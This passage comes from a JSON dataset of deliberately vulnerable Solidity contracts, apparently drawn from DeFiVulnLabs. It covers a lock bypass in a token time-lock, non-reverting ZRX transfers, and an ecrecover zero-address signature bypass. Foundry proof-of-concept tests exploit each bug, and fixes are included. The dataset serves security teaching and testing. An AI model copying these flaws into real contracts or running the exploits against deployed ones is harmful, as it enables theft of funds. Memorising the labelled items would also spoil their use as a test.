locker.amount = amount;\n        locker.lockTime = lockTime;\n        locker.tokenAddress = tokenAddress;\n\n        _nextLockerId++;\n    }\n\n    function unlockToken(uint256 lockerId) public {\n        Locker storage locker = _unlockToken[msg.sender][lockerId];\n        // Save the amount to a local variable\n        uint256 amount = locker.amount;\n        require(locker.hasLockedTokens, \"No locked tokens\");\n\n        // Incorrect sanity checks.\n        if (block.timestamp > locker.lockTime) {\n            locker.amount = 0;\n        }\n\n        // Transfer tokens to the locker owner\n        // This is where the exploit happens, as this can be called multiple times\n        // before the lock time has elapsed.\n        IERC20(locker.tokenAddress).transfer(msg.sender, amount);\n    }\n}\n\ncontract BanksLP is ERC20, Ownable {\n    constructor() ERC20(\"BanksLP\", \"BanksLP\") {\n        _mint(msg.sender, 10000 * 10 ** decimals());\n    }\n\n    function mint(address to, uint256 amount) public onlyOwner {\n        _mint(to, amount);\n    }\n}\n\ncontract FixedeBank {\n    struct Locker {\n        bool hasLockedTokens;\n        uint256 amount;\n        uint256 lockTime;\n        address tokenAddress;\n    }\n\n    mapping(address => mapping(uint256 => Locker)) private _unlockToken;\n    uint256 private _nextLockerId = 1;\n\n    function createLocker(\n        address tokenAddress,\n        uint256 amount,\n        uint256 lockTime\n    ) public {\n        require(amount > 0, \"Amount must be greater than 0\");\n        require(lockTime > block.timestamp, \"Lock time must be in the future\");\n        require(\n            IERC20(tokenAddress).balanceOf(msg.sender) >= amount,\n            \"Insufficient token balance\"\n        );\n\n        // Transfer the tokens to this contract\n        IERC20(tokenAddress).transferFrom(msg.sender, address(this), amount);\n\n        // Create the locker\n        Locker storage locker = _unlockToken[msg.sender][_nextLockerId];\n        locker.hasLockedTokens = true;\n        locker.amount = amount;\n        locker.lockTime = lockTime;\n        locker.tokenAddress = tokenAddress;\n\n        _nextLockerId++;\n    }\n\n    function unlockToken(uint256 lockerId) public {\n        Locker storage locker = _unlockToken[msg.sender][lockerId];\n\n        require(locker.hasLockedTokens, \"No locked tokens\");\n        require(block.timestamp > locker.lockTime, \"Tokens are still locked\");\n        // Save the amount to a local variable\n        uint256 amount = locker.amount;\n\n        // Mark the tokens as unlocked\n        locker.hasLockedTokens = false;\n        locker.amount = 0;\n\n        // Transfer tokens to the locker owner\n        IERC20(locker.tokenAddress).transfer(msg.sender, amount);\n    }\n}\n",
    "vulnerable_contract_only": "contract VulnerableBank {\n    struct Locker {\n        bool hasLockedTokens;\n        uint256 amount;\n        uint256 lockTime;\n        address tokenAddress;\n    }\n\n    mapping(address => mapping(uint256 => Locker)) private _unlockToken;\n    uint256 private _nextLockerId = 1;\n\n    function createLocker(\n        address tokenAddress,\n        uint256 amount,\n        uint256 lockTime\n    ) public {\n        require(amount > 0, \"Amount must be greater than 0\");\n        require(lockTime > block.timestamp, \"Lock time must be in the future\");\n        require(\n            IERC20(tokenAddress).balanceOf(msg.sender) >= amount,\n            \"Insufficient token balance\"\n        );\n\n        // Transfer the tokens to this ",
    "vulnerable_function": "multiple",
    "vulnerable_lines": [],
    "vulnerability_type": "logic_error",
    "severity": "medium",
    "difficulty_tier": 2,
    "vulnerability_name": "Incorrect sanity checks - Multiple Unlocks Before Lock Time Elapse",
    "description": "The bug lies in the unlockToken function, which lacks a check to ensure that block.timestamp is larger than locktime. \nThis allows tokens to be unlocked multiple times before the lock period has elapsed, \npotentially leading to significant financial loss.",
    "scenario": "",
    "fix_description": "Add a require statement to check that the current time is greater than the lock time before the tokens can be unlocked.\n\nor fix:\nuint256 amount = locker.amount;\nif (block.timestamp > locker.lockTime) {\n    IERC20(locker.tokenAddress).transfer(msg.sender, amount);\n    locker.amount = 0;\n    }",
    "references": [],
    "is_vulnerable": true,
    "has_poc": true,
    "has_remediation": true,
    "context_level": "single_file",
    "original_source_path": "src/test/Incorrect_sanity_checks.sol",
    "framework": "foundry"
  },
  {
    "id": "defivulnlabs_returnfalse",
    "source_dataset": "DeFiVulnLabs",
    "language": "solidity",
    "chain": "evm",
    "file_name": "Returnfalse.sol",
    "file_content": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.18;\n\nimport \"forge-std/Test.sol\";\n\nimport \"@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol\";\nimport \"@openzeppelin/contracts/token/ERC20/IERC20.sol\";\n\n/*\nName: No Revert on Failure\n\nDescription:\nSome tokens do not revert on failure, but instead return false (e.g. ZRX).\n\nZRX transfer return false:\n    function transfer(address _to, uint _value) returns (bool) {\n        //Default assumes totalSupply can't be over max (2^256 - 1).\n        if (balances[msg.sender] >= _value && balances[_to] + _value >= balances[_to]) {\n            balances[msg.sender] -= _value;\n            balances[_to] += _value;\n            Transfer(msg.sender, _to, _value);\n            return true;\n        } else { return false; }\n    }\n\nMitigation:\nUse OpenZeppelin\u2019s\u00a0SafeERC20\u00a0library and change\u00a0transfer\u00a0to\u00a0safeTransfer.\n*/\n\ncontract ContractTest is Test {\n    using SafeERC20 for IERC20;\n    IERC20 constant zrx = IERC20(0xE41d2489571d322189246DaFA5ebDe1F4699F498);\n\n    function setUp() public {\n        vm.createSelectFork(\"mainnet\", 16138254);\n    }\n\n    function testTransfer() public {\n        vm.startPrank(0xef0DCc839c1490cEbC7209BAa11f46cfe83805ab);\n        zrx.transfer(address(this), 123); //return false, do not revert\n        vm.stopPrank();\n    }\n\n    function testSafeTransferFail() public {\n        vm.startPrank(0xef0DCc839c1490cEbC7209BAa11f46cfe83805ab);\n\n        // https://github.com/foundry-rs/foundry/issues/5367 can't vm.expectRevert\n        // vm.expectRevert(\"SafeERC20: ERC20 operation did not succeed\");\n        zrx.safeTransfer(address(this), 123); //revert\n\n        vm.stopPrank();\n    }\n\n    receive() external payable {}\n}\n",
    "vulnerable_contract_only": "see full file",
    "vulnerable_function": "multiple",
    "vulnerable_lines": [],
    "vulnerability_type": "logic_error",
    "severity": "medium",
    "difficulty_tier": 2,
    "vulnerability_name": "No Revert on Failure",
    "description": "Some tokens do not revert on failure, but instead return false (e.g. ZRX).\n\nZRX transfer return false:\n    function transfer(address _to, uint _value) returns (bool) {\n        //Default assumes totalSupply can't be over max (2^256 - 1).\n        if (balances[msg.sender] >= _value && balances[_to] + _value >= balances[_to]) {\n            balances[msg.sender] -= _value;\n            balances[_to] += _value;\n            Transfer(msg.sender, _to, _value);\n            return true;\n        } else { return false; }\n    }",
    "scenario": "",
    "fix_description": "Use OpenZeppelin\u2019s\u00a0SafeERC20\u00a0library and change\u00a0transfer\u00a0to\u00a0safeTransfer.",
    "references": [],
    "is_vulnerable": true,
    "has_poc": true,
    "has_remediation": false,
    "context_level": "single_file",
    "original_source_path": "src/test/Returnfalse.sol",
    "framework": "foundry"
  },
  {
    "id": "defivulnlabs_ecrecover",
    "source_dataset": "DeFiVulnLabs",
    "language": "solidity",
    "chain": "evm",
    "file_name": "ecrecover.sol",
    "file_content": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.18;\n\nimport \"forge-std/Test.sol\";\n\n/*\nName: ecrecover returns address(0)\n\nDescription:\nIn the SimpleBank contract, the transfer function takes a message hash and a signature (v, r, s values) as inputs.\nIt recovers the signer address and checks if it equals Admin. The vulnerability lies in the fact \nthat the ecrecover function may return a 0x0 address when the signature parameters \nare invali, If v value isn't 27 or 28. it will return address(0).\n\nMitigation:  \nVerify that the result from ecrecover isn't 0 or instead use OpenZeppelin\u2019s ECDSA library.\n\nREF:\nhttps://twitter.com/1nf0s3cpt/status/1674268926761668608\nhttps://github.com/code-423n4/2021-09-swivel-findings/issues/61\nhttps://github.com/Kaiziron/numen_ctf_2023_writeup/blob/main/wallet.md\n*/\n\ncontract ContractTest is Test {\n    SimpleBank SimpleBankContract;\n\n    function setUp() public {\n        SimpleBankContract = new SimpleBank();\n    }\n\n    function testecRecover() public {\n        emit log_named_decimal_uint(\n            \"Before exploiting, my balance\",\n            SimpleBankContract.getBalance(address(this)),\n            18\n        );\n        bytes32 _hash = keccak256(\n            abi.encodePacked(\"\\x19Ethereum Signed Message:\\n32\")\n        );\n        (, bytes32 r, bytes32 s) = vm.sign(1, _hash);\n\n        // If v value isn't 27 or 28. it will return address(0)\n        uint8 v = 29;\n        SimpleBankContract.transfer(address(this), 1 ether, _hash, v, r, s);\n\n        emit log_named_decimal_uint(\n            \"After exploiting, my balance\",\n            SimpleBankContract.getBalance(address(this)),\n            18\n        );\n    }\n\n    receive() external payable {}\n}\n\ncontract SimpleBank {\n    mapping(address => uint256) private balances;\n    address Admin; //default is address(0)\n\n    function getBalance(address _account) public view returns (uint256) {\n        return balances[_account];\n    }\n\n    function recoverSignerAddress(\n        bytes32 _hash,\n        uint8 _v,\n        bytes32 _r,\n        bytes32 _s\n    ) private pure returns (address) {\n        address recoveredAddress = ecrecover(_hash, _v, _r, _s);\n        return recoveredAddress;\n    }\n\n    function transfer(\n        address _to,\n        uint256 _amount,\n        bytes32 _hash,\n        uint8 _v,\n        bytes32 _r,\n        bytes32 _s\n    ) public {\n        require(_to != address(0), \"Invalid recipient address\");\n\n        address signer = recoverSignerAddress(_hash, _v, _r, _s);\n        console.log(\"signer\", signer);\n        //Mitigation\n        //require(signer != address(0), \"Invalid signature\");\n        require(signer == Admin, \"Invalid signature\");\n\n        balances[_to] += _amount;\n    }\n}\n",
    "vulnerable_contract_only": "contract SimpleBank {\n    mapping(address => uint256) private balances;\n    address Admin; //default is address(0)\n\n    function getBalance(address _account) public view returns (uint256) {\n        return balances[_account];\n    }\n\n    function recoverSignerAddress(\n        bytes32 _hash,\n        uint8 _v,\n        bytes32 _r,\n        bytes32 _s\n    ) private pure returns (address) {\n        address recoveredAddress = ecrecover(_hash, _v, _r, _s);\n        return recoveredAddress;\n    }\n\n    function transfer(\n        address _to,\n        uint256 _amount,\n        bytes32 _hash,\n        uint8 _v,\n        bytes32 _r,\n        bytes32 _s\n    ) public {\n        require(_to != address(0), \"Invalid recipient address\");\n\n        address signer = recoverSignerAddress(_hash, _v, _r, _s);\n        console.log(\"signer\", signer);\n        //Mitigation\n        //require(signer != address(0), \"Invalid signature\");\n        require(signer == Admin, \"Invalid signature\");\n\n        balances[_to] += _amount;\n    }\n}\n",
    "vulnerable_function": "multiple",
    "vulnerable_lines": [],
    "vulnerability_type": "logic_error",
    "severity": "medium",
    "difficulty_tier": 2,
    "vulnerability_name": "ecrecover returns address(0)",
    "description": "In the SimpleBank contract, the transfer function takes a message hash and a signature (v, r, s values) as inputs.\nIt recovers the signer address and checks if it equals Admin. The vulnerability lies in the fact \nthat the ecrecover function may return a 0x0 address when the signature parameters \nare invali, If v value isn't 27 or 28. it will return address(0).",
    "scenario": "",
    "fix_description": "Verify that the result from ecrecover isn't 0 or instead use OpenZeppelin\u2019s ECDSA library.",
    "references": [],
    "is_vulnerable": true,
    "has_poc": true,
    "has_remediation": false,
    "context_level": "single_file",
    "original_source_path": "src/test/ecrecover.sol",
    "framework": "foundry"
  }
]